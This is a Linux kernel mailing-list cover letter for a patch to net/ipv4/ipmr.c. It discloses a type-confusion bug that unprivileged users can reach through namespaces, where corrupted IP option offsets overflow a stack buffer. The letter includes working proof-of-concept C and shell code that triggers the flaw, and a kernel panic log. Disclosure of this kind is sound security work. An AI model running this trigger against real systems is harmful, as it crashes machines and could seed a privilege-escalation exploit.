Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=74.125.82.169
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1792478389;
	b=zUb/PZc6t3JXVwc5Q3WN5i8KkNZFMY11JLzK6+iRPwpGg4YZ/uhT9dyXByT/6EDSCw19
	 7fomPsy90jGGanWFJcAKkbVbI3ZaKtkYFhNkFnP3I5YL3kNT1chLgVtNyI/IbOFIzAzMW
	 wEcKDJ0GbDW99tQprUvnPBwNxNo4Fq7j2N8VylT1QoGpHyYgvn7tbut5LztxESn/Z23QZ
	 XYwT+qWmIa2LsVwiptQ2SKwZYEdHnr5ubngGA/p6ZH7mrNi1mZcdKvKdgNRtv8G/GOaDP
	 +f6YdUtNC8Mjjogz8JNEQcijg0nt5wTxpAD6izEqQlSnd/iaRFJY11GYjCf2xP7QdFA==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792478389;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
	 Content-Transfer-Encoding;
	bh=Mm2eIWeYDvq6rkIdkycz7a/9VHZDL94tQ0sAVGq3By4=;
	b=4FWqxN1p6oC7xCT73/xODmh86mPuiQv5tmo8Y5iOlVjICJSf4BQ2CKIOgncSI/qh5u49
	 NAPIqwDQttHqFZIc5fY+yL7MJ/Iid11YDQOSM0M9nm8arn6dwm3b834Ay0G6M0DAP/8BR
	 qUcG7d8fhQwDMyx90XodcSK4IDc/5JlC4zGATrqGRXEloBfwmgdbwr4vSAeoWekS7qNlp
	 jFWMpROOmCMFLlWYdT+F5drd3aV9/YcT8a68SQdH4KK2Z8qCSagWYEH7luLEpbHH+gPFN
	 LYEK/9VvEYl1EI3Y+Rwv51zwT4xxVC0m3uhy4z1J7kHi4c3bgMtw36JB0/qN/YL5BTw==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=BHgAnYZ6;
	arc=none smtp.remote-ip=74.125.82.169
Received: from mail-dy1-f169.google.com (mail-dy1-f169.google.com [74.125.82.169])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 43BD0606A319
	for <netdev@vger.kernel.org>; Tue, 20 Oct 2026 06:39:49 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 43BD0606A319
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=BHgAnYZ6
Received: by mail-dy1-f169.google.com with SMTP id 5a478bee46e88-35ef6b49813so5435508eec.0
        for <netdev@vger.kernel.org>; Mon, 19 Oct 2026 23:39:49 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1792478388; x=1793083188; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=Mm2eIWeYDvq6rkIdkycz7a/9VHZDL94tQ0sAVGq3By4=;
        b=BHgAnYZ6iigj1QMm9Ge43qCpfM2lCEx/1XflM5M68EsiYzboOe6vSbiMFEtoOjNuzy
         0L67X9YR9hrvr9LmprHeiImEq1tKfPBmTMacbMycnQ5RQ1uuVZoDtlgvW97MzznP9+ie
         KNHPjuAuQxsdjY9IgB6/wkE+V0sHpzonjV8HL7Bldbq9SsQwlOyqx+yMKUo0YgzDWf6r
         HUwBrFy9J1n+7sHbUEIMPgSVrFC9Ob2huRZjNT7SbQRc3YDq54H84c7SamAUZaAzoRlB
         lDdWPdzvJTnTa9KZO4vnFp0dK12zOwd9S/57nN4+cDve7fUqFzrCcwnZLP/52cmejWuW
         sZxg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792478388; x=1793083188;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=Mm2eIWeYDvq6rkIdkycz7a/9VHZDL94tQ0sAVGq3By4=;
        b=YrKStZOKxyHEaS5TNW5bEsV1mA0gFvqsOk4rNdL+zc50vCWwv9zi5GS6UYHIyAo5hh
         b9Hqa/sBh8DyuN3yfqGD0yMzTRY2M9OWxTumVrIiqXhjCfhG4p9zuAXru3VoeHxQ8fwg
         t4mRT656Kl98xdwgB7+N1PnGKe54BgS7oowvUNu9j+1oUBa3SPpYGtsau+hWrvnHuyT3
         nKYaxyxd1SMsMevtIKn4XsoYTbvApJYLmB6rMwZJy85dENDfgr8Znaw80ZoNHNXark9i
         Haq+BBsVZpBP8rnzR2EqmLcXUJl2f4omul9Rv+ZmRU4koch695GZ/+ZqWoLO4Ui49U1b
         d1iQ==
X-Forwarded-Encrypted: i=1; AKwUvBwyAJCrPjZJYvd5l/RSqHGcBbW1vVWAUoDa3R/y0EfmssGHNybp9umJ7GszWmf5C4ew+ZjEs90=@vger.kernel.org
X-Gm-Message-State: AFq9FYJGqHdR+WhczT/hw6pSpf/OfnHq+8tyY4E1on4+hy3cmt0952tE
	khJoUjSMjTcr9e/LANSuHu9oaXcyxc/Htv6YjP+VBiOnCsttMizubtqyPxJsaSZRq8Uf
X-Gm-Gg: AYBFou0evDgwevgN2nJeMnJUSFU3AnQRrvLW5tXArFA9AxMk27J8NTjJO3RAsbck8ye
	B58pileqUEhn/uP1wg0XQcE8RegapRO9OMKGEs233OiQ7oEjRxzDcLSrhIxHn6Pf82UUqZp97UM
	Db4BmnUfewRoxMdNxML8038diyJpwxOS2yyi9AonZNjqUBGdp7EJ6TtgJCvpGDacG86poJOwVy7
	7IFuBWXCJDDqKyQHehq/kTjbNaH9X+6AiJtInKIDMbqjQqUJyEpAvkTV4QqFgt3+n04X7SRW19o
	vtF1i6oo9SC01S+wJtACqT9MFWQFZtOKXNuEC6cD7/PJOrv/ziFLiGXP/xdD9S0qImm1z0cr4oy
	ZZD3lavMb3tE6IwJJSFuXe9B0n6HeavZDUenYcHuSe44QpzGz/8C3Wv80jrZRrfJUQ2KetC/cJX
	OVXt1m/fRd4XtTpEmg63k98st+SSIHzDgIeV53STfDM/bTEyp/VDCjs9lyNdofCTqYZmHVgjTnZ
	1HwjdFfLDa876/U37pTwXP1
X-Received: by 2002:a05:693c:20c5:20b0:35c:2986:35ab with SMTP id 5a478bee46e88-361a1668b4dmr14284307eec.13.1792478388009;
        Mon, 19 Oct 2026 23:39:48 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([203.175.14.54])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-36081bafa7asm37435014eec.14.2026.10.19.23.39.44
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 19 Oct 2026 23:39:47 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: idosch@nvidia.com,
	edumazet@google.com,
	netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	davem@davemloft.net,
	pabeni@redhat.com,
	horms@kernel.org,
	leone4fernando@gmail.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net v6 0/1] ipmr: only copy pktinfo to cache reports
Date: Tue, 20 Oct 2026 14:39:35 +0800
Message-ID: <cover.1792476357.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.55.0
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Post: <mailto:netdev@vger.kernel.org>
List-Help: <mailto:netdev+help@vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netdev+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv4/ipmr.c. The bug is reachable
by a non-root user via user and net namespaces with namespace-local
CAP_NET_ADMIN and CAP_NET_RAW.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

ipmr_get_route() can clone a synthetic RTM_GETROUTE skb for an unresolved
multicast route and store the requester portid in NETLINK_CB(skb).portid
before queuing it to the unresolved multicast route path.

ipmr_cache_report() builds a short IGMP report for the raw mroute socket.
To support IP_PKTINFO, the original code calls ipv4_pktinfo_prepare() on
the input packet and copies the entire skb control block to the report skb.
For synthetic route-query packets, this copies NETLINK_CB bytes into a skb
that the raw IPv4 receive path interprets as IPCB. The requester portid
overlaps IPCB(skb)->opt fields. With IP_RECVOPTS or IP_RETOPTS enabled on
the mroute socket, corrupted option offsets can make the receive path copy
beyond the short report packet or overflow the fixed stack option buffer
in ip_options_echo().

The WHOLEPKT/WRVIFWHOLE path has a related issue: skb_realloc_headroom()
inherits the original IPCB, then prepends a 20-byte header with ihl = 5.
Stale IPCB(skb)->opt offsets then make ip_cmsg_recv_opts() copy bytes
from after that header as IP_RECVOPTS.

ipv4_pktinfo_prepare() also modifies the input skb control block. When
packet info is disabled on the mroute socket, it clears the pktinfo fields,
even though the input skb can continue through the data path.

Save and restore the original pkt->cb around ipv4_pktinfo_prepare(). Clear
the report skb control block and copy only the prepared pktinfo fields.
Doing this after both report branches preserves input skb metadata, keeps
IP_PKTINFO support, and clears inherited IP option state for
WHOLEPKT/WRVIFWHOLE reports.

Reproducer:

    make
    ./poc.sh namespace

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/sh
set -eu

mode="${1:-root}"

sysctl -w kernel.panic_on_warn=0 >/dev/null 2>&1 || true
sysctl -w kernel.printk="7 4 1 7" >/dev/null 2>&1 || true

make clean
make

case "$mode" in
root)
	exec ./poc
	;;
namespace)
	exec unshare -Urn --map-root-user ./poc
	;;
*)
	echo "usage: $0 [root|namespace]" >&2
	exit 1
	;;
esac

------END poc.sh--------

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/mroute.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <net/if.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define DEV_NAME "jwq0"
#define DEV_ADDR "10.23.0.1/24"
#define SRC_ADDR "10.23.0.2"
#define DST_ADDR "239.1.2.3"
#define NETLINK_PORTID 0x000f0001U

static void die(const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	vfprintf(stderr, fmt, ap);
	va_end(ap);
	fputc('\n', stderr);
	exit(EXIT_FAILURE);
}

static void die_errno(const char *msg)
{
	die("%s: %s", msg, strerror(errno));
}

static void run_cmd(const char *fmt, ...)
{
	char cmd[512];
	va_list ap;
	int rc;

	va_start(ap, fmt);
	vsnprintf(cmd, sizeof(cmd), fmt, ap);
	va_end(ap);

	printf("[cmd] %s\n", cmd);
	fflush(stdout);
	rc = system(cmd);
	if (rc != 0)
		die("command failed (%d): %s", rc, cmd);
}

static void addattr_l(struct nlmsghdr *nlh, size_t maxlen, int type,
		      const void *data, size_t alen)
{
	size_t len = RTA_LENGTH(alen);
	size_t newlen = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(len);
	struct rtattr *rta;

	if (newlen > maxlen)
		die("netlink attribute overflow");

	rta = (struct rtattr *)(((char *)nlh) + NLMSG_ALIGN(nlh->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len = len;
	memcpy(RTA_DATA(rta), data, alen);
	nlh->nlmsg_len = newlen;
}

static int create_dummy_interface(void)
{
	unsigned int ifindex;

	run_cmd("ip link del %s 2>/dev/null || true", DEV_NAME);
	run_cmd("ip link set lo up");
	run_cmd("ip link add %s type dummy", DEV_NAME);
	run_cmd("ip addr add %s dev %s", DEV_ADDR, DEV_NAME);
	run_cmd("ip link set %s up", DEV_NAME);

	ifindex = if_nametoindex(DEV_NAME);
	if (!ifindex)
		die_errno("if_nametoindex(" DEV_NAME ")");

	printf("[*] %s ifindex=%u\n", DEV_NAME, ifindex);
	return (int)ifindex;
}

static int setup_mroute_socket(int ifindex)
{
	struct vifctl vif = {
		.vifc_vifi = 0,
		.vifc_flags = VIFF_USE_IFINDEX,
		.vifc_threshold = 1,
		.vifc_rate_limit = 0,
		.vifc_lcl_ifindex = ifindex,
	};
	int opt = 1;
	int fd;

	fd = socket(AF_INET, SOCK_RAW, IPPROTO_IGMP);
	if (fd < 0)
		die_errno("socket(AF_INET, SOCK_RAW, IPPROTO_IGMP)");

	if (setsockopt(fd, SOL_IP, IP_RETOPTS, &opt, sizeof(opt)) < 0)
		die_errno("setsockopt(IP_RETOPTS)");

	if (setsockopt(fd, IPPROTO_IP, MRT_INIT, &opt, sizeof(opt)) < 0)
		die_errno("setsockopt(MRT_INIT)");

	if (setsockopt(fd, IPPROTO_IP, MRT_ADD_VIF, &vif, sizeof(vif)) < 0)
		die_errno("setsockopt(MRT_ADD_VIF)");

	printf("[*] mroute socket ready on vif ifindex=%d\n", ifindex);
	return fd;
}

static int setup_netlink_socket(void)
{
	struct sockaddr_nl local = {
		.nl_family = AF_NETLINK,
		.nl_pid = NETLINK_PORTID,
	};
	int fd;

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (fd < 0)
		die_errno("socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE)");

	if (bind(fd, (struct sockaddr *)&local, sizeof(local)) < 0)
		die_errno("bind(AF_NETLINK)");

	printf("[*] netlink portid=0x%08x\n", NETLINK_PORTID);
	printf("[*] portid bytes: optlen=%u srr=%u rr=%u ts=%u\n",
	       NETLINK_PORTID & 0xff,
	       (NETLINK_PORTID >> 8) & 0xff,
	       (NETLINK_PORTID >> 16) & 0xff,
	       (NETLINK_PORTID >> 24) & 0xff);
	return fd;
}

static void trigger_getroute(int nl_fd, int ifindex)
{
	struct {
		struct nlmsghdr nlh;
		struct rtmsg rtm;
		char buf[256];
	} req;
	struct sockaddr_nl kernel = {
		.nl_family = AF_NETLINK,
	};
	struct iovec iov = {
		.iov_base = &req,
		.iov_len = sizeof(req),
	};
	struct msghdr msg = {
		.msg_name = &kernel,
		.msg_namelen = sizeof(kernel),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	struct in_addr src;
	struct in_addr dst;

	memset(&req, 0, sizeof(req));
	req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg));
	req.nlh.nlmsg_type = RTM_GETROUTE;
	req.nlh.nlmsg_flags = NLM_F_REQUEST;
	req.nlh.nlmsg_seq = 1;
	req.rtm.rtm_family = AF_INET;
	req.rtm.rtm_dst_len = 32;
	req.rtm.rtm_src_len = 32;

	if (inet_pton(AF_INET, SRC_ADDR, &src) != 1)
		die("inet_pton failed for %s", SRC_ADDR);
	if (inet_pton(AF_INET, DST_ADDR, &dst) != 1)
		die("inet_pton failed for %s", DST_ADDR);

	addattr_l(&req.nlh, sizeof(req), RTA_SRC, &src, sizeof(src));
	addattr_l(&req.nlh, sizeof(req), RTA_DST, &dst, sizeof(dst));
	addattr_l(&req.nlh, sizeof(req), RTA_IIF, &ifindex, sizeof(ifindex));

	iov.iov_len = req.nlh.nlmsg_len;

	printf("[*] sending RTM_GETROUTE for %s -> %s on ifindex %d\n",
	       SRC_ADDR, DST_ADDR, ifindex);
	fflush(stdout);
	if (sendmsg(nl_fd, &msg, 0) < 0)
		die_errno("sendmsg(RTM_GETROUTE)");
}

static void receive_report(int mrt_fd)
{
	char payload[512];
	char control[4096];
	struct iovec iov = {
		.iov_base = payload,
		.iov_len = sizeof(payload),
	};
	struct msghdr msg = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = control,
		.msg_controllen = sizeof(control),
	};
	ssize_t n;

	printf("[*] waiting for mroute report; recvmsg should crash in IP_RETOPTS\n");
	fflush(stdout);
	n = recvmsg(mrt_fd, &msg, 0);
	if (n < 0)
		die_errno("recvmsg(mroute_sk)");

	printf("[!] recvmsg returned %zd bytes without crashing\n", n);
}

int main(void)
{
	int ifindex;
	int mrt_fd;
	int nl_fd;

	printf("[*] ipmr_cache_report type-confusion trigger\n");
	printf("[*] expected rr copy length comes from first byte of %s (%u)\n",
	       DST_ADDR, 239U);

	ifindex = create_dummy_interface();
	mrt_fd = setup_mroute_socket(ifindex);
	nl_fd = setup_netlink_socket();

	trigger_getroute(nl_fd, ifindex);
	receive_report(mrt_fd);

	close(nl_fd);
	close(mrt_fd);
	return 0;
}

------END poc.c--------

----BEGIN crash log----

[  195.459259] Kernel panic - not syncing: stack-protector: Kernel stack is corrupted in: ip_cmsg_recv_offset (/home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:65 (discriminator 1) /home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:187 (discriminator 1))
[  195.460787] CPU: 2 UID: 1028 PID: 1307 Comm: poc Not tainted 6.12.95 #1
[  195.461640] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  195.463100] Call Trace:
[  195.463432]  <TASK>
[  195.463733]  panic (/home/roxy/linux-block-patch/build/../kernel/panic.c:955 (discriminator 1))
[  195.464178]  ? ip_cmsg_recv_offset (/home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:65 (discriminator 1) /home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:187 (discriminator 1))
[  195.464769]  __stack_chk_fail (/home/roxy/linux-block-patch/build/../kernel/panic.c:1195 (discriminator 1))
[  195.465309]  ip_cmsg_recv_offset (/home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:65 (discriminator 1) /home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:187 (discriminator 1))
[  195.465878]  ? __skb_datagram_iter (/home/roxy/linux-block-patch/build/../include/linux/skbuff.h:2533 /home/roxy/linux-block-patch/build/../net/core/datagram.c:394)
[  195.466458]  ? __pfx_simple_copy_to_iter+0x10/0x10
[  195.467091]  ? ____sys_recvmsg+0x98/0x1d0
[  195.467633]  ? ___sys_recvmsg+0x91/0xe0
[  195.468154]  ? srso_alias_return_thunk+0x5/0xfbef5
[  195.468802]  ? __sys_recvmsg+0x83/0xe0
[  195.469305]  ? do_syscall_64+0x58/0x120
[  195.469824]  ? entry_SYSCALL_64_after_hwframe+0x76/0x7e
[  195.470498]  </TASK>
[  195.470983] Kernel Offset: disabled

-----END crash log-----

Zhiling Zou (1):
  ipmr: only copy pktinfo to cache reports

 net/ipv4/ipmr.c | 12 ++++++++++--
 1 file changed, 10 insertions(+), 2 deletions(-)

-- 
2.55.0

